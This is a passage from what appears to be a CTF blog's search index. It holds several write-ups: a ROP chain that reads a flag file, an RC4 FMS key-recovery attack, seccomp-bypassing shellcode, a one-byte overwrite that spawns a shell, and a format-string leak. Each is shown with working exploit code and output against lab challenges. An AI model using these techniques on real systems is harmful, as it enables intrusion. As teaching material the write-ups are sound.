▀▘ ▗ ▗▘▜▜▖▝▟▞▘ ▘ ▞ ▘ ▛▙ ▜▞▀ ▝ ▗▌▐▀▀ ▞▀ [Strange man in mask screams some nonsense]: s4d [Strange man in mask]: In order to proceed, tell us the secret phrase: s34s0nf1n4l3b00 [Strange man in mask]: Season finale is here! Take this souvenir with you for good luck: [0x7fffffffdf70] [Strange man in mask]: Now, tell us a wish for next year: aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa [Strange man in mask]: That's a nice wish! Let the Spooktober Spirit be with you! Program received signal SIGSEGV, Segmentation fault. 0x0000000000401491 in finale ()  gef➤ pattern offset $rsp [+] Searching for '$rsp' [+] Found at offset 72 (little-endian search) likely [+] Found at offset 65 (big-endian search)  So we need exacly 72 bytes to reach the saved return address.\nExploit strategy The description of the challenge tells that the remote Glibc version has been modified, so we should not depend on Glibc to exploit the binary.\nThis time, instead of spawning a remote shell, we will aim to print the flag using functions open, read and write, which are already linked to the binary and thus do not depend on Glibc. In order to call them, we will use the Procedure Linkage Table (PLT), which is a table that has jump instructions to the corresponding entry of the Global Offset Table (GOT), which has the runtime addresses of the functions inside Glibc if they have been called at least once. Since PIE is disabled, the PLT addresses are static.\nSince NX is enabled, we must use Return Oriented Programming (ROP) in order to execute arbitrary code. For x86_64 binaries, arguments for function calls are stored in registers (in order: $rdi, $rsi, $rdx, $rcx\u0026hellip;). We can set these registers using gadgets, which are sets of instructions that end in ret. The purpose of using gadgets is to fill the stack with pointers to gadgets, so that the program executes a gadget and returns to the next one. That\u0026rsquo;s why this payload is known as ROP chain.\nWe can find useful gadgets for $rdi and $rsi:\n$ ROPgadget --binary finale | grep ': pop r.i ; ret' 0x00000000004012d6 : pop rdi ; ret 0x00000000004012d8 : pop rsi ; ret  Nevertheless, we don\u0026rsquo;t have any simple way to set $rdx:\n$ ROPgadget --binary finale | grep rdx 0x0000000000401574 : add rax, rdx ; mov byte ptr [rax], 0 ; jmp 0x401588 0x0000000000401573 : clc ; add rax, rdx ; mov byte ptr [rax], 0 ; jmp 0x401588 0x0000000000401571 : mov eax, dword ptr [rbp - 8] ; add rax, rdx ; mov byte ptr [rax], 0 ; jmp 0x401588 0x0000000000401011 : sal byte ptr [rdx + rax - 1], 0xd0 ; add rsp, 8 ; ret  These are the declarations for open, read and write:\nintopen(constchar*pathname, intflags);  ssize_tread(intfd, void*buf, size_tcount);  ssize_twrite(intfd, constvoid*buf, size_tcount);  Finding a stable ROP chain There will be no problem when calling open, because it expects two arguments ($rdi and $rsi). But read and write require $rdx to contain the count of bytes to read/write, so it is an important value.\nLuckily, there are some calls to read and write in finale, let\u0026rsquo;s disassemble this function:\n$ objdump -M intel --disassemble=finale finale finale: file format elf64-x86-64 Disassembly of section .init: Disassembly of section .plt: Disassembly of section .plt.sec: Disassembly of section .text: 0000000000401407 \u0026lt;finale\u0026gt;: 401407: f3 0f 1e fa endbr64 40140b: 55 push rbp 40140c: 48 89 e5 mov rbp,rsp 40140f: 48 83 ec 40 sub rsp,0x40 401413: 48 8d 45 c0 lea rax,[rbp-0x40] 401417: 48 89 c6 mov rsi,rax 40141a: 48 8d 05 ef 13 00 00 lea rax,[rip+0x13ef] # 402810 \u0026lt;_IO_stdin_used+0x810\u0026gt; 401421: 48 89 c7 mov rdi,rax 401424: b8 00 00 00 00 mov eax,0x0 401429: e8 12 fd ff ff call 401140 \u0026lt;printf@plt\u0026gt; 40142e: 48 8d 05 3b 14 00 00 lea rax,[rip+0x143b] # 402870 \u0026lt;_IO_stdin_used+0x870\u0026gt; 401435: 48 89 c7 mov rdi,rax 401438: b8 00 00 00 00 mov eax,0x0 40143d: e8 fe fc ff ff call 401140 \u0026lt;printf@plt\u0026gt; 401442: 48 8b 05 d7 2b 00 00 mov rax,QWORD PTR [rip+0x2bd7] # 404020 \u0026lt;stdin@@GLIBC_2.2.5\u0026gt; 401449: 48 89 c7 mov rdi,rax 40144c: e8 4f fd ff ff call 4011a0 \u0026lt;fflush@plt\u0026gt; 401451: 48 8b 05 b8 2b 00 00 mov rax,QWORD PTR [rip+0x2bb8] # 404010 \u0026lt;stdout@@GLIBC_2.2.5\u0026gt; 401458: 48 89 c7 mov rdi,rax 40145b: e8 40 fd ff ff call 4011a0 \u0026lt;fflush@plt\u0026gt; 401460: 48 8d 45 c0 lea rax,[rbp-0x40] 401464: ba 00 10 00 00 mov edx,0x1000 401469: 48 89 c6 mov rsi,rax 40146c: bf 00 00 00 00 mov edi,0x0 401471: e8 fa fc ff ff call 401170 \u0026lt;read@plt\u0026gt; 401476: ba 54 00 00 00 mov edx,0x54 40147b: 48 8d 05 2e 14 00 00 lea rax,[rip+0x142e] # 4028b0 \u0026lt;_IO_stdin_used+0x8b0\u0026gt; 401482: 48 89 c6 mov rsi,rax 401485: bf 01 00 00 00 mov edi,0x1 40148a: e8 a1 fc ff ff call 401130 \u0026lt;write@plt\u0026gt; 40148f: 90 nop 401490: c9 leave 401491: c3 ret Disassembly of section .fini: $ objdump -M intel --disassemble=finale finale | grep .dx 401464: ba 00 10 00 00 mov edx,0x1000 401476: ba 54 00 00 00 mov edx,0x54  So after calling finale, $rdx will be set to 0x54 which is enough.\nTherefore, we will call open, then return to finale and then call read and write. We must use this order because open sets $rdx = 0 at the end.\nExploit development For the call to open, we must use a pointer to \u0026quot;flag.txt\u0026quot; as pathname and 0 as flags (which read-only mode). Notice that finale outputs the address of data:\nvoidfinale() { undefined data[64];  printf(\"\\n[Strange man in mask]: Season finale is here! Takethis souvenir with you for good luck: [%p]\", data); // ... }  So we can extract this pointer and use it as the pointer to \u0026quot;flag.txt\u0026quot;. Therefore, our junk data must start with \u0026quot;flag.txt\u0026quot; and we can fill the rest with null bytes up to 72 bytes (the offset):\ndefmain(): p=get_process() p.sendlineafter(b'In order to proceed, tell us the secret phrase: ', b's34s0nf1n4l3b00') p.recvuntil(b'Season finale is here! Take this souvenir with you for good luck: [') addr=int(p.recvuntil(b']').decode()[:-1], 16) rop=ROP(elf) pop_rdi_ret=rop.find_gadget(['pop rdi', 'ret'])[0] pop_rsi_ret=rop.find_gadget(['pop rsi', 'ret'])[0] offset=72 payload=b'flag.txt' payload+=b'\\0'*(offset-len(payload)) payload+=p64(pop_rdi_ret) payload+=p64(addr) payload+=p64(pop_rsi_ret) payload+=p64(0) payload+=p64(elf.plt.open) payload+=p64(elf.sym.finale) p.sendlineafter(b'Now, tell us a wish for next year: ', payload) p.interactive() if__name__=='__main__': main()  $ python3 solve.py [*] './finale_patched' Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x3ff000) RUNPATH: b'./glibc' [+] Starting local process './finale_patched': pid 465900 [*] Loading gadgets for './finale_patched' [*] Switching to interactive mode [Strange man in mask]: That's a nice wish! Let the Spooktober Spirit be with you! [Strange man in mask]: Season finale is here! Take this souvenir with you for good luck: [0x7ffc476c9ef0] [Strange man in mask]: Now, tell us a wish for next year: $  As shown, we have executed finale again, so the ROP chain has worked.\nNow we can continue with the next part of the ROP chain. Since the program opens three file descriptors at the start (0 for stdin, 1 for stdout and 2 for stderr), the next file descriptor will be 3. This value is used by read. We can use the address leak again to store the contents of flag.txt. The write call is very similar to read:\nfd=3 offset=72 payload=b'flag.txt' payload+=b'\\0'*(offset-len(payload)) payload+=p64(pop_rdi_ret) payload+=p64(addr) payload+=p64(pop_rsi_ret) payload+=p64(0) payload+=p64(elf.plt.open) payload+=p64(elf.sym.finale) p.sendlineafter(b'Now, tell us a wish for next year: ', payload) payload=b'A' * offset payload+=p64(pop_rdi_ret) payload+=p64(fd) payload+=p64(pop_rsi_ret) payload+=p64(addr) payload+=p64(elf.plt.read) payload+=p64(pop_rdi_ret) payload+=p64(1) payload+=p64(pop_rsi_ret) payload+=p64(addr) payload+=p64(elf.plt.write) p.sendlineafter(b'Now, tell us a wish for next year: ', payload) p.recvline() p.recvline() p.recvline() print(p.recvline()) p.close()  Using the above code, we can finish the exploit and get the flag locally:\n$ python3 solve.py [*] './finale_patched' Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x3ff000) RUNPATH: b'./glibc' [+] Starting local process './finale_patched': pid 470225 [*] Loaded 7 cached gadgets for 'finale_patched' b'HTB{f4k3_fl4g_f0r_t3st1ng}\\n' [*] Stopped process './finale_patched' (pid 470225)  Flag So, let\u0026rsquo;s try remotely:\n$ python3 solve.py 159.65.49.148:31748 [*] './finale_patched' Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x3ff000) RUNPATH: b'./glibc' [+] Opening connection to 159.65.49.148 on port 31748: Done [*] Loaded 7 cached gadgets for 'finale_patched' b'HTB{53450n_f1n4l3_w1th0ut_l1bc}\\n' [*] Closed connection to 159.65.49.148 port 31748  The full exploit code is here: solve.py.\n","image":"/images/pwn.png","permalink":"https://7rocky.github.io/en/ctf/other/hackthebooctf/finale/","section":"ctf","summary":"64-bit binary. Buffer Overflow. open-read-write ROP chain","time":12,"title":"Finale"},{"contents":"We are given a some Python source code and a server to connect to:\n$ nc 161.35.172.25 32275 Connected to the cyborg's debugging interface Options: 1. Encrypt your text. 2. Claim the key. \u0026gt;  Static code analysis This is the relevant part of the code:\ndefchallenge(req): key=bytes.fromhex(KEY) assert(len(key) ==27) req.sendall(b'Connected to the cyborg\\'s debugging interface\\n') whileTrue: req.sendall( b'\\nOptions:\\n1. Encrypt your text.\\n2. Claim the key.\\n\u0026gt; ') try: response=json.loads(req.recv(4096).decode()) ifresponse['option'] =='encrypt': iv=bytes.fromhex(response['iv']) pt=bytes.fromhex(response['pt']) ct=encrypt(key, iv, pt) payload={'response': 'success', 'pt': response['pt'], 'ct': ct} payload=json.dumps(payload) req.sendall(payload.encode()) elifresponse['option'] =='claim': answer=bytes.fromhex(response['key']) ifhashlib.sha256(answer).hexdigest() ==hashlib.sha256(key).hexdigest(): payload={'response': 'success', 'flag': FLAG} payload=json.dumps(payload) req.sendall(payload.encode()) else: payload={'response': 'fail', 'message': 'Better luck next time.'} payload=json.dumps(payload) req.sendall(payload.encode()) else: payload={'response': 'error', 'message': 'Invalid option!'} payload=json.dumps(payload) req.sendall(payload.encode()) exceptExceptionase: payload=json.dumps( {'response': 'error', 'message': 'An error occured!'}) req.sendall(payload.encode()) return  First of all, we see that we need to interact with the server using JSON-formatted messages.\nMoreover, we can send arbitrary text messages to the server and they will be encrypted using RC4 as follows:\ndefencrypt(key, iv, pt): returnARC4.new(iv+key).encrypt(pt).hex()  Notice that we also need to provide the IV, because the RC4 cipher is created from iv + key.\nIn order to get the flag, we must extract the secret key, which we know is 27 bytes long.\nFMS attack There is a well-known attack on cryptosystems that use RC4, such as WEP protocol for Wi-Fi (which is fully broken). This attack is the Fluhrer, Mantin and Shamir attack (FMS attack in short). Notice that the accronym of the challenge name is a hint that points to this attack.\nRC4 is a stream cipher that works as follows:\nBasically, a stream cipher has an input key and outputs a random bit stream, so that the encryption is the XOR between the bit stream and the plaintext bits. Using the same key will result in the same bit stream.\nThe following explanation is based mainly on these resources:\n Weaknesses in the Key Scheduling Algorithm of RC4 FMS Presentation  And for the solution script, I will adapt the source code of FMS-Attack.\nBrief explanation RC4 uses several S-Box to generate the bit stream. Following the above paper, on Section 7.1, we have the same situation on this challenge. That is, we control the IV and it is prepended to the secret key before creating the RC4 cipher.\nLet\u0026rsquo;s define $K$ as the input key for the RC4 cipher, and $\\mathrm{SK}$ the actual secret key. Also. let $L$ be the length of the key. For convenience, the IV will only have 3 values. Therefore:\n$$ K[0 .. L - 1] = [ \\mathrm{IV}[0], \\mathrm{IV}[1], \\mathrm{IV}[2], \\mathrm{SK}[0], \\mathrm{SK}[1], \\dots, \\mathrm{SK}[L - 4]] $$\nThe issue is that using $\\mathrm{IV} = [A + 3, N - 1, V]$ we will be able to recover the byte $K[A + 3]$ with high probability. This happens because on each iteration of the Key Schedule Algorithm (KSA) some bytes are swapped by index, and there is a resolved condition where $\\mathrm{KSB}[0] = S[S[1] + S[j]]$, where $\\mathrm{KSB}$ stands for the key stream bytes (the output of the RC4 cipher).\nThe first two elements of the IV are crafted so that the first round swaps indeces $0$ and $A + 3$ (because index i starts at $0$ and j starts a $0$ as well, but it is updated to j = (j + s[i]) % 256, which is $A + 3$):\nThe second iteration swaps indeces $1$ and $A + 3$, because i is increased by one and j is updated as j = (j + s[i]) % 256, which happens to be unchanged:\nAs the paper says: on the next round, j is advanced by $V + 2$, which implies that each distinct IV assigns a different value to j, and thus beyond this point, each IV acts differently. Since the attacker knows the value of $V$ and $K[3], \\dots, K[A + 2]$, he can compute the exact behavior of the key setup until before round $A + 3$. At this point, he knows the value of j at iteration $A + 2$ and the exact values of the permutation. If the value at indeces $0$ and $1$ have been disturbed, the attacker discards this IV. Otherwise, j is advanced by $S_{A + 2}[i_{A + 3}] + K[A + 3]$, and then the swap is done, resulting in the below structure:\nSolution script There are two important scripts in FMS-Attack. One of them is WEPOutput.py, which generates the cipher and stores the output values in a CSV file; and keyRecover.py, which takes the CSV file and extracts the key with the FMS attack.\nTo solve the challenge, I combined the two scripts and removed the CSV file for storing intermediate values. Instead, we need to use the server to generate the necessary values to perform the FMS attack.\nThis attack works in WEP because the plaintext always starts with aa (in hexadecimal), which is part of the SNAP header. We can use any other byte, but I kept it as is.\nFlag If we run the solution script, we will find the flag (it can take quite a few minutes):\n$ python3 solve.py 161.35.172.25:32275 [+] Opening connection to 161.35.172.25 on port 32275: Done [+] A: 27 [+] Key: A1DD163ADAC252ADE631A89A203C2BE92B981EAAE6DAC3044EACE1 [+] Flag: HTB{7h3_FMS_@tt3ck_br0k3_@_l0t_0f_th17gs_i7_w1f1!!} [*] Closed connection to 161.35.172.25 port 32275  The full script can be found in here: solve.py.\n","image":"/images/cryptography.png","permalink":"https://7rocky.github.io/en/ctf/htb-challenges/crypto/find-marhers-secret/","section":"ctf","summary":"RC4. FMS attack","time":5,"title":"Find Marher's Secret"},{"contents":"We have a 32-bit binary called EasyPass.exe which is a Windows PE file:\n$ file EasyPass.exe EasyPass.exe: PE32 executable (GUI) Intel 80386, for MS Windows  If we execute the binary in a Windows machine, it will a password:\nSince the password is wrong, we will see a message \u0026ldquo;Wrong Password!\u0026rdquo;:\nA static code analysis with Ghidra won\u0026rsquo;t be useful. Hence, let\u0026rsquo;s use a debugger like x32dbg to debug the binary. Once it is open, we can search for the previous error string:\nAnd set a breakpoint into that address location (actually, at the jne instruction):\nOnce we run again the program, we will see the expected password:\nSo the flag is: HTB{fortran!}.\n","image":"/images/reversing.png","permalink":"https://7rocky.github.io/en/ctf/htb-challenges/reversing/find-the-easy-pass/","section":"ctf","summary":"Debugging with x32dbg","time":1,"title":"Find The Easy Pass"},{"contents":"We are given a 64-bit binary called fleet_management:\nArch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled  If we open it in Ghidra, we will see this main function:\nintmain() { setup(); fprintf(stdout, \"%s%sFleet Management System %s\\n\", \u0026amp;DAT_001023e5, \u0026amp;DAT_001020e9, \u0026amp;DAT_001023e0); fprintf(stdout, \"\\n%s[*] Loading . . .\\n%s\", \u0026amp;DAT_001020f1, \u0026amp;DAT_001020e9); sleep(2); menu(); return0; }  It calls menu:\nvoidmenu() { longin_FS_OFFSET; undefined8 uVar1; charlocal_13 [3]; undefined8 canary; canary =*(undefined8 *) (in_FS_OFFSET +0x28); memset(local_13, 0, 3); do{ fwrite(\"\\n-_-_-_-_-_-_-_-_-_-_-_-_-\\n\", 1, 0x1b, stdout); fwrite(\"| |\\n\", 1, 0x1b, stdout); fwrite(\"| [1] View the Fleet |\\n\", 1, 0x1b, stdout); fwrite(\"| [2] Control Panel |\\n\", 1, 0x1b, stdout); fwrite(\"| [3] User Settings |\\n\", 1, 0x1b, stdout); fwrite(\"| [4] Exit |\\n\", 1, 0x1b, stdout); fwrite(\"| |\\n\", 1, 0x1b, stdout); fwrite(\"-_-_-_-_-_-_-_-_-_-_-_-_-\\n\", 1, 0x1a, stdout); fwrite(\"\\n[*] What do you want to do? \", 1, 0x1d, stdout); read(0, local_13, 2); switch(local_13[0]) { case'1': fprintf(stdout, \"\\n%s[*] Connecting to the Encrypted channel . . .\\n%s\", \u0026amp;DAT_001020f1, \u0026amp;DAT_001020e9); sleep(1); fprintf(stdout, \"\\n%s[*] Fetching Data . . .\\n%s\", \u0026amp;DAT_001020f1, \u0026amp;DAT_001020e9); sleep(1); uVar1 =0x10166a; fwrite(\"\\n=============================\\n\", 1, 0x1f, stdout); fprintf(stdout, \"| %sPDS Thanatos - %s[%sActive%s]%s|\\n\", \u0026amp;DAT_00102180, \u0026amp;DAT_00102178, \u0026amp;DAT_001020f1,\u0026amp;DAT_00102178,\u0026amp;DAT_001020e9, uVar1); fprintf(stdout, \"| %sCS Meteor - %s[%sActive%s]%s|\\n\", \u0026amp;DAT_00102180, \u0026amp;DAT_00102178, \u0026amp;DAT_001020f1,\u0026amp;DAT_00102178,\u0026amp;DAT_001020e9); fprintf(stdout, \"| %sLWS Proximo - %s[%sActive%s]%s|\\n\", \u0026amp;DAT_00102180, \u0026amp;DAT_00102178, \u0026amp;DAT_001020f1, \u0026amp;DAT_00102178, \u0026amp;DAT_001020e9); fprintf(stdout, \"| %sSTS Goliath - %s[%sInactive%s]%s|\\n\", \u0026amp;DAT_00102180, \u0026amp;DAT_00102178, \u0026amp;DAT_00102211, \u0026amp;DAT_00102178, \u0026amp;DAT_001020e9); fwrite(\"=============================\\n\", 1, 0x1e, stdout); fwrite(\"\\nKey:\\n\", 1, 6, stdout); fprintf(stdout, \"%sPDS: Planet Destroyer Ship\\n\", \u0026amp;DAT_00102180); fwrite(\"CS: Combat Spaceship\\n\", 1, 0x15, stdout); fwrite(\"LWS: Light Weight Spaceship\\n\", 1, 0x1c, stdout); fprintf(stdout, \"STS: Space Transportation Ship%s\\n\", \u0026amp;DAT_001020e9); break; case'2': fprintf(stdout, \"\\n%s[*] Authenticating . . .\\n%s\", \u0026amp;DAT_001020f1, \u0026amp;DAT_001020e9); sleep(1); fprintf(stdout, \"\\n%s[!] Error: You are not member of an authorized group.\\n%s\", \u0026amp;DAT_00102211, \u0026amp;DAT_001020e9); break; case'3': fprintf(stdout, \"\\n%s[!] Error: You should authenticate first.\\n%s\", \u0026amp;DAT_00102211, \u0026amp;DAT_001020e9); break; case'4': fprintf(stdout, \"\\n[*] Bye! %s\\n\", \u0026amp;DAT_00102380); /* WARNING: Subroutine does not return */ exit(0); case'9': beta_feature(); default: fprintf(stdout, \"\\n%s[!] Error: Invalid Option.\\n%s\", \u0026amp;DAT_00102211, \u0026amp;DAT_001020e9); } } while(true); }  This is a fairly large function, but the only option that seems to be insteresting is beta_feature (option 9):\nvoidbeta_feature() { code *__buf;  __buf =(code *) malloc(0x3c); mprotect((void*) ((ulong) __buf \u0026amp;0xfffffffffffff000), 0x3c, 7); read(0, __buf, 0x3c); skid_check(); (*__buf)(); }  Basically, we have the chance to enter machine code instructions that will be executed. We can enter up to 0x3c (60) bytes. However, we are limited by skid_function, which implements some seccomp rules to allow specific syscall instructions:\nvoidskid_check() { undefined8 uVar1;  uVar1 =seccomp_init(0); seccomp_rule_add(uVar1, 0x7fff0000, 0x3c, 0); seccomp_rule_add(uVar1, 0x7fff0000, 0xe7, 0); seccomp_rule_add(uVar1, 0x7fff0000, 0x101, 0); seccomp_rule_add(uVar1, 0x7fff0000, 0x28, 0); seccomp_rule_add(uVar1, 0x7fff0000, 0xf, 0); seccomp_load(uVar1); }  In order to enumerate these seccomp rules, we can use seccomp-tools:\n$ seccomp-tools dump ./fleet_management 🛰 Fleet Management System 📡 [*] Loading . . . -_-_-_-_-_-_-_-_-_-_-_-_- | | | [1] View the Fleet | | [2] Control Panel | | [3] User Settings | | [4] Exit | | | -_-_-_-_-_-_-_-_-_-_-_-_- [*] What do you want to do? 9 line CODE JT JF K ================================= 0000: 0x20 0x00 0x00 0x00000004 A = arch 0001: 0x15 0x00 0x09 0xc000003e if (A != ARCH_X86_64) goto 0011 0002: 0x20 0x00 0x00 0x00000000 A = sys_number 0003: 0x35 0x00 0x01 0x40000000 if (A \u0026lt; 0x40000000) goto 0005 0004: 0x15 0x00 0x06 0xffffffff if (A != 0xffffffff) goto 0011 0005: 0x15 0x04 0x00 0x0000000f if (A == rt_sigreturn) goto 0010 0006: 0x15 0x03 0x00 0x00000028 if (A == sendfile) goto 0010 0007: 0x15 0x02 0x00 0x0000003c if (A == exit) goto 0010 0008: 0x15 0x01 0x00 0x000000e7 if (A == exit_group) goto 0010 0009: 0x15 0x00 0x01 0x00000101 if (A != openat) goto 0011 0010: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0011: 0x06 0x00 0x00 0x00000000 return KILL  So, we are allowed to use sys_rt_sigreturn, sys_sendfile, sys_exit, sys_exit_group and sys_openat. There are quite a few websites that list all Linux x86_64 syscall instructions with the needed parameters and register configuration. For example, this one.\nWith the allowed syscall instructions, we can open the flag file (flag.txt) with sys_openat and send it to the stdout file descriptor with sys_sendfile. Additionally, we can exit with sys_exit.\nSo, sys_openat needs the following register setup:\n $rax = 0x101 $rdi has a directory file descriptor $rsi has a pointer to the filename string $rdx has some flags $rcx has the mode of operation (this one can be omitted)  Specifically, we can go to man7.org and learn more about the meaning of the parameters:\nintopenat(intdirfd, constchar*pathname, intflags);  There is an alias for a directory file descriptor called AT_FDCWD that represents the current working directory (more information at stackoverflow.com). Moreover, we will open the file as read-only (O_RDONLY).\nOnce we have sys_openat set, we will receive the file descriptor of the flag file as the return value in $rax. It will be the time to use sys_sendfile (actually, sys_sendfile64):\n $rax = 0x28 $rdi has the output file descriptor (1, which represents stdout) $rsi has the input file descriptor (the one returned by sys_openat) $rdx has an offset where to start reading (0) $rcx has the count of bytes to send (for example, 100)  ssize_tsendfile(intout_fd, intin_fd, off_t*offset, size_tcount);  For people that have not written any assembly, it might be useful to write a C program with the above setup, compile it and analyze the generated assembly instructions:\n#include\u0026lt;fcntl.h\u0026gt; #include\u0026lt;stdlib.h\u0026gt; #include\u0026lt;sys/sendfile.h\u0026gt; voidmain() { intfd; fd =openat(AT_FDCWD, \"flag.txt\", O_RDONLY); sendfile(1, fd, 0, 100); exit(0); }  $ gcc test.c -O3 -o test $ ./test HTB{f4k3_fl4g_f0r_t3st1ng}  This is the generated assembly code (optimized due to -O3 flag in gcc):\n$ objdump -M intel --disassemble=main test test: file format elf64-x86-64 Disassembly of section .init: Disassembly of section .plt: Disassembly of section .plt.got: Disassembly of section .plt.sec: Disassembly of section .text: 00000000000010a0 \u0026lt;main\u0026gt;: 10a0: f3 0f 1e fa endbr64 10a4: 50 push rax 10a5: 58 pop rax 10a6: 31 d2 xor edx,edx 10a8: 48 8d 35 55 0f 00 00 lea rsi,[rip+0xf55] # 2004 \u0026lt;_IO_stdin_used+0x4\u0026gt; 10af: bf 9c ff ff ff mov edi,0xffffff9c 10b4: 31 c0 xor eax,eax 10b6: 48 83 ec 08 sub rsp,0x8 10ba: e8 b1 ff ff ff call 1070 \u0026lt;openat@plt\u0026gt; 10bf: bf 01 00 00 00 mov edi,0x1 10c4: b9 64 00 00 00 mov ecx,0x64 10c9: 31 d2 xor edx,edx 10cb: 89 c6 mov esi,eax 10cd: e8 ae ff ff ff call 1080 \u0026lt;sendfile@plt\u0026gt; 10d2: 31 ff xor edi,edi 10d4: e8 b7 ff ff ff call 1090 \u0026lt;exit@plt\u0026gt; Disassembly of section .fini:  This is great, but let\u0026rsquo;s do the same with syscall instructions:\nxor rdx, rdx push rdx mov rsi, 'flag.txt' # as hexadecimal number push rsi mov rsi, rsp xor rdi, rdi sub rdi, 100 mov rax, 0x101 syscall mov rcx, 0x64 mov esi, eax xor rdi, rdi inc edi mov al, 0x28 syscall mov al, 0x3c syscall  Notice how I set $rsi to the pointer to \u0026quot;flag.txt\\0\u0026quot;, and also how $rdi = -100 (AT_FDCWD). I also optimized a bit the use of registers so that the generated shellcode is shorter.\nIf we enter the above shellcode in the fleet_management program, we will get the flag:\n$ python3 solve.py 165.22.125.212:30121 [*] './fleet_management' Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled [+] Opening connection to 165.22.125.212 on port 30121: Done [*] Shellcode length: 0x38 [+] HTB{sh3llc0d3_45_4_b4ckd00r} [*] Closed connection to 165.22.125.212 port 30121  The full exploit can be found in here: solve.py.\n","image":"/images/pwn.png","permalink":"https://7rocky.github.io/en/ctf/htb-challenges/pwn/fleet-management/","section":"ctf","summary":"64-bit binary. seccomp rules. Custom shellcode","time":6,"title":"Fleet Management"},{"contents":"We are given a 64-bit binary called main:\nArch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled  If we open the binary in Ghidra we see these functions:\nvoidbad_function() { execve(\"/bin/sh\", NULL, NULL); } voidvuln() { chardata[10]; read(0, data, 170); } intmain() { setvbuf(stderr, NULL, 2, 0); setvbuf(stdout, NULL, 2, 0); vuln(); return0; }  There exists a Buffer Overflow vulnerability. Notice that data is a character array of 10 bytes, and the program reads up to 170 bytes. Hence, we are able to overwrite values on the stack (for instance, the return address).\nThe idea is to overwrite the return address with the address of bad_function. However, PIE is enabled, so the real addresses of the binary functions are randomized at the beginning.\nFor the moment, let\u0026rsquo;s use GDB to find the offset we need to overwrite the return address:\n$ gdb -q main Reading symbols from main... (No debugging symbols found in main) gef➤ pattern create 30 [+] Generating a pattern of 30 bytes (n=8) aaaaaaaabaaaaaaacaaaaaaadaaaaa [+] Saved as '$_gef0' gef➤ run Starting program: ./main aaaaaaaabaaaaaaacaaaaaaadaaaaa Program received signal SIGSEGV, Segmentation fault. 0x00005555555551b2 in vuln ()  gef➤ pattern offset $rsp [+] Searching for '$rsp' [+] Found at offset 18 (little-endian search) likely [+] Found at offset 23 (big-endian search)  Alright, we need 18 bytes to reach the position where the return address is stored. Let\u0026rsquo;s set a breakpoint right here and run it again to enter exactly 18 bytes (17 plus new line character):\ngef➤ break Breakpoint 1 at 0x5555555551b2 gef➤ run Starting program: ./main AAAAAAAAAAAAAAAAA Breakpoint 1, 0x00005555555551b2 in vuln ()  gef➤ x/10gx $rsp - 0x10 0x7fffffffe668: 0x4141414141414141 0x0a41414141414141 0x7fffffffe678: 0x0000555555555201 0x0000000000000000 0x7fffffffe688: 0x00007ffff7de1083 0x00007ffff7ffc620 0x7fffffffe698: 0x00007fffffffe778 0x0000000100000000 0x7fffffffe6a8: 0x00005555555551b3 0x0000555555555230 gef➤ x $rsp 0x7fffffffe678: 0x0000555555555201 gef➤ backtrace #0 0x00005555555551b2 in vuln () #1 0x0000555555555201 in main () Backtrace stopped: Cannot access memory at address 0xa41414141414149 gef➤ p bad_function $1 = {\u0026lt;text variable, no debug info\u0026gt;} 0x555555555208 \u0026lt;bad_function\u0026gt;  Taking a closer look, we see that the return address and the address of bad_function differ just in the last byte, so we are able to overflow a single byte and redirect the execution to bad_function.\nThis can be done manually:\n$ (echo -ne 'AAAAAAAAAAAAAAAAAA\\x08'; cat) | ./main ls main solve.py  Or using a Python script to connect to the remote instance:\n$ python3 solve.py blackhat2-7c9ff8336e7deb83a4583a4529a7c0a8-0.chals.bh.ctf.sa [*] './main' Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled [+] Opening connection to blackhat2-7c9ff8336e7deb83a4583a4529a7c0a8-0.chals.bh.ctf.sa on port 443: Done [*] Switching to interactive mode $ cat flag.txt BlackHatMEA{96:21:368fd8bb8dffb88a9690546fb5d3ee9f27464b6c}  The full exploit can be found in here: solve.py.\n","image":"/images/pwn.png","permalink":"https://7rocky.github.io/en/ctf/other/fno-stack-protector/","section":"ctf","summary":"BlackHat MEA CTF 2022. 64-bit binary. Buffer Overflow. Redirect program execution","time":3,"title":"fno-stack-protector"},{"contents":"We are told to find the flag in this image:\nHowever, the flag is not visible inside the image and it is not hidden in its content. However, we can find the flag in the file raw content.\nIn order to extract printable characters from the image we can use strings and then filter by CTFlearn piping the previous command to grep:\n$ strings 95f6edfb66ef42d774a5a34581f19052.jpg | grep CTFlearn CTFlearn{wow!_data_is_cool}  ","image":"/images/forensics.png","permalink":"https://7rocky.github.io/en/ctf/ctflearn/forensics/forensics-101/","section":"ctf","summary":"Printable characters in files","time":1,"title":"Forensics 101"},{"contents":"We are given a 64-bit binary called format:\nArch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled  Reverse engineering After executing it, we see that the program only echoes what we enter:\n$ ./format asdf asdf fdsa fdsa  Using Ghidra, we can reverse engineer the source code and see what the program is doing:\nintmain(EVP_PKEY_CTX *param_1) { longcanary; longin_FS_OFFSET; canary =*(long*) (in_FS_OFFSET +0x28); init(param_1); echo(); if(canary !=*(long*) (in_FS_OFFSET +0x28)) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } return0; }  The main function calls echo, which is the one responding with the same message we enter:\nvoidecho() { longin_FS_OFFSET; chardata[264]; longcanary;  canary =*(long*) (in_FS_OFFSET +0x28); do{ fgets(data, 256, stdin); printf(data); } while(true); }  Format String vulnerability However, it is putting directly our input in printf as first parameter, so this is a clear Format String vulnerability.\nUsing this vulnerability we are able to leak values from the stack using formats like %lx (for hexadecimal values):\n$ ./format %lx 7f3f0d7e4a03 %lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx. 7f3f0d7e4a03.0.7f3f0d705fd2.7ffe6cdfdd60.0.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.9800000000a.  